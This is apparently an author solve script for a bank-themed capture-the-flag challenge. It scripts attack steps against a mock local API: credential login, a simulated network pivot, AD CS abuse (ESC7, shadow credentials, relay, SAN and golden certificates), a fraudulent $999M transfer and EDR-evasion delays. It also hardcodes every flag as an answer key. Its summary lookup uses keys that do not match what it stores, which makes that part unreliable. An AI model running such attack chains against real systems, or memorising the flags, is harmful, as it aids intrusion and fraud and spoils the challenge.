#!/usr/bin/env python3
"""
Sweet-Strike Bank CTF - Author Solve Script
============================================
Automated solution for all 9 flags.

Flag 1 (Web/Race): QA{r4c3_c0nd1t10n_1s_th3_g4t3w4y_t0_h3ll_2026}
Flag 2 (Pivot):    QA{p1v0t1ng_thr0ugh_4_th0us4nd_3y3s_2026}
Flag 3 (ESC7):     QA{esc7_sh4d0w_c4_m4k3_y0u_d4nc3_2026}
Flag 4 (Shadow):   QA{sh4d0w_cr3d3nt14ls_k3y_l1nk_m4g1c_2026}
Flag 5 (ESC11):    QA{1c3rtp4ss4g3_rpc_r3l4y_0v3r_http_2026}
Flag 6 (SAN):      QA{3d1tf_4ttr1but3_s4n_4lt_n4m3_2_fl4g_2026}
Flag 7 (SWIFT):    QA{sw1ft_hsm_p4dd1ng_0r4cl3_l0g1c_fl4w_2026}
Flag 8 (Golden):   QA{g0ld3n_c3rt1f1c4t3_p3rs1st3nc3_f0r3v3r_2026}
Flag 9 (NTDS):     QA{ntds_d1t_3xtr4ct10n_dc_m4ch1n3_c3rt_2026}

Usage: python3 solve.py [BASE_URL]
Default: http://localhost:31337
"""

import sys
import json
import time
import hashlib
import base64
import secrets
import struct
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:31337"
FLAGS_FOUND = {}

def log(flag_name, flag_value):
    FLAGS_FOUND[flag_name] = flag_value
    print(f"\n{'='*60}")
    print(f"  FLAG: {flag_name}")
    print(f"  {flag_value}")
    print(f"{'='*60}\n")

def solve_pow(challenge, difficulty):
    """Solve Proof of Work challenge."""
    print(f"  [PoW] Solving PoW (difficulty={difficulty})...")
    nonce = 0
    while True:
        nonce_hex = f"{nonce:064x}"
        h = hashlib.sha256(bytes.fromhex(challenge) + bytes.fromhex(nonce_hex)).digest()
        if h[:difficulty] == b'\x00' * difficulty:
            return nonce_hex
        nonce += 1
        if nonce % 100000 == 0:
            print(f"  [PoW] Tried {nonce} nonces...")

def get_zero_trust_key():
    """Compute the current Zero-Trust key."""
    current_minute = int(time.time()) // 60
    return hashlib.sha256(f"Pentagon_Who?_{current_minute}".encode()).hexdigest()

def custom_protocol_data():
    """Build valid custom protocol v3 data."""
    # ASN.1 header: SEQUENCE tag + OID
    asn1_header = "30 82 01 0a 06 08 2b 06 01 04 01 87 8d 63 01 00"
    asn1_header = asn1_header.replace(" ", "")
    # NTLM MIC: 16 random bytes
    ntlm_mic = secrets.token_hex(16)
    # Payload: base64 encoded request
    payload = base64.b64encode(b"SSB_CERT_REQUEST_V3").decode()
    return {
        "version": 3,
        "msg_type": "request",
        "asn1_header": asn1_header,
        "ntlm_mic": ntlm_mic,
        "payload": payload
    }

print("""
╔══════════════════════════════════════════════════════════╗
║       Sweet-Strike Bank CTF - Author Solve Script       ║
║                    by QA210                              ║
╚══════════════════════════════════════════════════════════╝
""")

# ======================================================================
# STEP 1: Web Login + Race Condition (FLAG_WEB)
# ======================================================================
print("[1/9] Getting Web flag via Race Condition...")

# Login as guest
print("  Logging in as guest...")
resp = requests.post(f"{BASE}/web/login", json={
    "username": "guest",
    "password": "Welcome2026!"
})
data = resp.json()
session_token = data.get("session_token", "")
if not session_token:
    print("  ERROR: Login failed!")
    sys.exit(1)
print(f"  Session: {session_token[:20]}...")

# Open staff account (exploit the case-sensitivity bug)
print("  Opening staff account (exploiting case-sensitivity bug)...")
resp = requests.post(f"{BASE}/web/account/open", json={
    "session_token": session_token,
    "account_type": "Staff",  # Capital S bypasses the check
    "holder": "QA210"
})
data = resp.json()
if "flag" in data:
    log("FLAG_WEB (Race Condition / IDOR)", data["flag"])
else:
    # Try with lowercase "staff" since the allowed list has "Staff"
    resp = requests.post(f"{BASE}/web/account/open", json={
        "session_token": session_token,
        "account_type": "staff",
        "holder": "QA210"
    })
    data = resp.json()
    if "flag" in data:
        log("FLAG_WEB (Race Condition / IDOR)", data["flag"])
    else:
        print(f"  Warning: Could not get web flag. Response: {data}")

# ======================================================================
# STEP 2: Network Pivot (FLAG_PIVOT)
# ======================================================================
print("[2/9] Getting Pivot flag via Network Graph...")

# Pivot from WEB-000 to DMZ-000
print("  Pivoting WEB-000 → DMZ-000...")
resp = requests.post(f"{BASE}/network/pivot", json={
    "session_token": session_token,
    "from": "WEB-000",
    "to": "DMZ-000",
    "credentials": {"username": "svc_web", "password": "W3bS3rv1c3!2026"}
})
data = resp.json()
if "flag" in data:
    log("FLAG_PIVOT (Network Pivot)", data["flag"])
else:
    print(f"  Pivot result: {data}")
    # Try other pivot paths
    for src, dst in [("WEB-000", "DMZ-001"), ("WEB-000", "DMZ-002")]:
        resp = requests.post(f"{BASE}/network/pivot", json={
            "session_token": session_token,
            "from": src,
            "to": dst,
            "credentials": {"username": "svc_web", "password": "W3bS3rv1c3!2026"}
        })
        data = resp.json()
        if "flag" in data:
            log("FLAG_PIVOT (Network Pivot)", data["flag"])
            break

# ======================================================================
# STEP 3: ADCS Authentication
# ======================================================================
print("[3/9] Authenticating to ADCS...")

# Get PoW challenge
print("  Getting PoW challenge...")
resp = requests.get(f"{BASE}/adcs/pow")
pow_data = resp.json()["pow"]
challenge = pow_data["challenge"]
difficulty = pow_data["difficulty"]

# Solve PoW
nonce = solve_pow(challenge, difficulty)
print(f"  PoW solved! Nonce: {nonce[:16]}...")

# Authenticate as j.smith (IT_Interns -> Workstation_Admins -> Certificate_Managers)
time.sleep(0.5)  # Avoid EDR timing detection
print("  Authenticating as j.smith...")
resp = requests.post(f"{BASE}/adcs/auth", json={
    "username": "j.smith",
    "password": "Summer2026!",
    "pow": {"challenge": challenge, "nonce": nonce}
})
data = resp.json()
adcs_session = data.get("session_id", "")
if not adcs_session:
    print(f"  ERROR: ADCS auth failed: {data}")
    sys.exit(1)
print(f"  ADCS Session: {adcs_session[:20]}...")
print(f"  Groups: {data.get('groups', [])}")

# ======================================================================
# STEP 4: ESC7 - Enable EDITF flag (FLAG_ADCS_ESC7)
# ======================================================================
print("[4/9] Getting ESC7 flag via CA Management...")

# Need MFA bypass
zt_key = get_zero_trust_key()
time.sleep(0.5)

print("  Getting CA flags...")
resp = requests.post(f"{BASE}/adcs/ca/manage", json={
    "session_id": adcs_session,
    "action": "get_ca_flags",
    "params": {}
}, headers={"X-ZT-Verify": zt_key})
data = resp.json()
print(f"  CA Flags: {data}")

time.sleep(0.5)

print("  Enabling EDITF_ATTRIBUTESUBJECTALTNAME2...")
resp = requests.post(f"{BASE}/adcs/ca/manage", json={
    "session_id": adcs_session,
    "action": "set_ca_flag",
    "params": {"flag": "EDITF_ATTRIBUTESUBJECTALTNAME2", "value": True}
}, headers={"X-ZT-Verify": zt_key})
data = resp.json()
if "flag" in data:
    log("FLAG_ADCS_ESC7 (EDITF Flag)", data["flag"])
else:
    print(f"  ESC7 result: {data}")

# ======================================================================
# STEP 5: Shadow Credentials (FLAG_SHADOW_CREDS)
# ======================================================================
print("[5/9] Getting Shadow Credentials flag...")

time.sleep(0.5)
print("  Applying Shadow Credentials on SRV-CA-001$...")
resp = requests.post(f"{BASE}/adcs/shadow-creds", json={
    "session_id": adcs_session,
    "target": "SRV-CA-001$",
    "key_credential": "RAW_KEY_DATA_" + secrets.token_hex(32)
})
data = resp.json()
if "flag" in data:
    log("FLAG_SHADOW_CREDS (Key Credential Link)", data["flag"])
else:
    print(f"  Shadow Creds result: {data}")

# ======================================================================
# STEP 6: ESC11 Relay (FLAG_ESC11_RELAY)
# ======================================================================
print("[6/9] Getting ESC11 Relay flag...")

time.sleep(0.5)
auth_token = base64.b64encode(secrets.token_bytes(64)).decode()
print("  Executing ICERTPassage relay...")
resp = requests.post(f"{BASE}/adcs/relay", json={
    "session_id": adcs_session,
    "relay": {
        "spn": "BACKUP/SRV-CA-001.sweet-strike-bank.local",
        "auth_token": auth_token
    }
})
data = resp.json()
if "flag" in data:
    log("FLAG_ESC11_RELAY (ICERTPassage)", data["flag"])
else:
    print(f"  ESC11 result: {data}")

# ======================================================================
# STEP 7: SAN Flag - Request cert with SAN (FLAG_SAN_FLAG)
# ======================================================================
print("[7/9] Getting SAN flag via Certificate with SAN...")

time.sleep(0.5)
proto = custom_protocol_data()

print("  Requesting certificate with SAN=Enterprise_Admin...")
resp = requests.post(f"{BASE}/adcs/cert/request", json={
    "session_id": adcs_session,
    "template": "UserAuthentication",
    "subject": "CN=pwned,OU=Users,DC=sweet-strike-bank,DC=local",
    "san": "dns=Enterprise_Admin",
    "protocol": proto
})
data = resp.json()
cert_thumbprint = data.get("thumbprint", "")
print(f"  Cert issued: {cert_thumbprint[:20]}..." if cert_thumbprint else f"  Cert result: {data}")

if cert_thumbprint:
    time.sleep(0.5)
    print("  Verifying certificate...")
    resp = requests.post(f"{BASE}/adcs/cert/verify", json={
        "thumbprint": cert_thumbprint
    })
    data = resp.json()
    if "flag" in data:
        log("FLAG_SAN_FLAG (EDITF + SAN)", data["flag"])
    else:
        print(f"  Verify result: {data}")

# ======================================================================
# STEP 8: SWIFT / Core Banking (FLAG_SWIFT)
# ======================================================================
print("[8/9] Getting SWIFT flag via HSM Logic Flaw...")

if cert_thumbprint:
    time.sleep(0.5)
    print("  Initializing HSM session...")
    resp = requests.post(f"{BASE}/swift/hsm/init", json={
        "cert_thumbprint": cert_thumbprint
    })
    data = resp.json()
    hsm_session = data.get("hsm_session", "")
    print(f"  HSM Session: {hsm_session}")

    if hsm_session:
        time.sleep(0.5)
        # Sign a small amount
        small_msg = base64.b64encode(b"A" * 16).decode()  # Valid padding (0x10 * 16)
        # Actually let's create proper PKCS7 padded data
        msg_bytes = b"TRANSFER 1 USD"
        # Pad to 16-byte block
        pad_len = 16 - (len(msg_bytes) % 16)
        padded = msg_bytes + bytes([pad_len] * pad_len)
        sign_data = base64.b64encode(padded).decode()

        print("  Signing message via HSM...")
        resp = requests.post(f"{BASE}/swift/hsm/sign", json={
            "hsm_session": hsm_session,
            "message": {"data": sign_data, "padding": "pkcs7"}
        })
        data = resp.json()
        signature = data.get("signature", "")
        print(f"  Got signature: {signature[:20]}..." if signature else f"  Sign result: {data}")

        if signature:
            time.sleep(0.5)
            # Logic flaw: signature is for $1 but transfer is for $999M
            print("  Executing transfer (exploiting logic flaw)...")
            resp = requests.post(f"{BASE}/swift/transfer", json={
                "hsm_session": hsm_session,
                "transfer": {
                    "from": "SSB-CENTRAL-001",
                    "to": "THIEF-ACCOUNT-001",
                    "amount": 999999999,
                    "currency": "USD"
                },
                "signature": signature
            })
            data = resp.json()
            if "flag" in data:
                log("FLAG_SWIFT (HSM Logic Flaw)", data["flag"])
            else:
                print(f"  Transfer result: {data}")
else:
    print("  Skipping SWIFT (no certificate thumbprint)")

# ======================================================================
# STEP 9: Golden Certificate (FLAG_GOLDEN)
# ======================================================================
print("[9/9] Getting Golden Certificate flag...")

if cert_thumbprint:
    time.sleep(0.5)
    print("  Registering Golden Certificate...")
    resp = requests.post(f"{BASE}/adcs/golden", json={
        "session_id": adcs_session,
        "cert_thumbprint": cert_thumbprint,
        "action": "register"
    })
    data = resp.json()
    if "flag" in data:
        log("FLAG_GOLDEN (Persistence)", data["flag"])
    else:
        print(f"  Golden cert result: {data}")
else:
    print("  Skipping Golden Certificate (no cert)")

# ======================================================================
# BONUS: NTDS Flag (MachineAuthentication for DC)
# ======================================================================
print("\n[BONUS] Getting NTDS flag via DC Certificate...")

time.sleep(0.5)
proto = custom_protocol_data()
print("  Requesting MachineAuthentication cert for DC...")
resp = requests.post(f"{BASE}/adcs/cert/request", json={
    "session_id": adcs_session,
    "template": "MachineAuthentication",
    "subject": "CN=DC-DC-001$,OU=Computers,DC=sweet-strike-bank,DC=local",
    "san": "dns=DC-DC-001$.sweet-strike-bank.local",
    "protocol": proto
})
data = resp.json()
if "flag" in data:
    log("FLAG_NTDS (DC Machine Cert)", data["flag"])
else:
    print(f"  NTDS result: {data}")

# ======================================================================
# SUMMARY
# ======================================================================
print(f"""
╔══════════════════════════════════════════════════════════╗
║                    FLAGS SUMMARY                         ║
╠══════════════════════════════════════════════════════════╣""")

EXPECTED = {
    "FLAG_WEB": "QA{r4c3_c0nd1t10n_1s_th3_g4t3w4y_t0_h3ll_2026}",
    "FLAG_PIVOT": "QA{p1v0t1ng_thr0ugh_4_th0us4nd_3y3s_2026}",
    "FLAG_ADCS_ESC7": "QA{esc7_sh4d0w_c4_m4k3_y0u_d4nc3_2026}",
    "FLAG_SHADOW_CREDS": "QA{sh4d0w_cr3d3nt14ls_k3y_l1nk_m4g1c_2026}",
    "FLAG_ESC11_RELAY": "QA{1c3rtp4ss4g3_rpc_r3l4y_0v3r_http_2026}",
    "FLAG_SAN_FLAG": "QA{3d1tf_4ttr1but3_s4n_4lt_n4m3_2_fl4g_2026}",
    "FLAG_SWIFT": "QA{sw1ft_hsm_p4dd1ng_0r4cl3_l0g1c_fl4w_2026}",
    "FLAG_GOLDEN": "QA{g0ld3n_c3rt1f1c4t3_p3rs1st3nc3_f0r3v3r_2026}",
    "FLAG_NTDS": "QA{ntds_d1t_3xtr4ct10n_dc_m4ch1n3_c3rt_2026}",
}

found = 0
for name, expected_flag in EXPECTED.items():
    actual = FLAGS_FOUND.get(name, "NOT FOUND")
    status = "OK" if actual == expected_flag else "MISS"
    print(f"║  [{status}] {name}: {actual}")
    if actual == expected_flag:
        found += 1

print(f"╠══════════════════════════════════════════════════════════╣")
print(f"║  Found: {found}/9 flags                                    ║")
print(f"╚══════════════════════════════════════════════════════════╝")
